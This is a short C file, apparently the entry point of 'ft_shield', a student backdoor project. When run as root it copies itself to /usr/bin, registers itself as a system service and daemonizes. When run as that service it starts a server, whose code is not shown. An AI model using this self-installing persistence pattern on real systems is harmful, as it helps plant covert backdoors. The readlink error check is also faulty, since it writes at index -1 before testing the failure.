#include <ft_shield.h>

int executed_mode(void)
{
	char	exec_path[256];
	ssize_t	len = readlink("/proc/self/exe", exec_path, sizeof(exec_path) - 1);
	exec_path[len] = '\0';

	if (len != -1)
	{
		if (strcmp(exec_path, "/usr/bin/ft_shield") == 0)
			return 0;
		else
			return 1;
	}
	else
		return -1;
}

int main(void)
{
	write(1, "rorozco- & rcabezas\n", 20);
	if (getuid()) // Works only with root permissions
		return EXIT_FAILURE;

	int	exec_mode;
	switch (exec_mode = executed_mode())
	{
		case 1: // Executed as root - Create service
			write(1, "Executed as root user\n", 23);
			copy_binary();
			create_service();
			skeleton_daemon();
			break ;
		case 0: // Running as service - Starts server
			write(1, "Executed as service\n", 21);
			start_server();
			break ;
		case -1: // Error
			write(1, "Error of readlink\n", 19);
			return EXIT_FAILURE;
	}

	return EXIT_SUCCESS;
}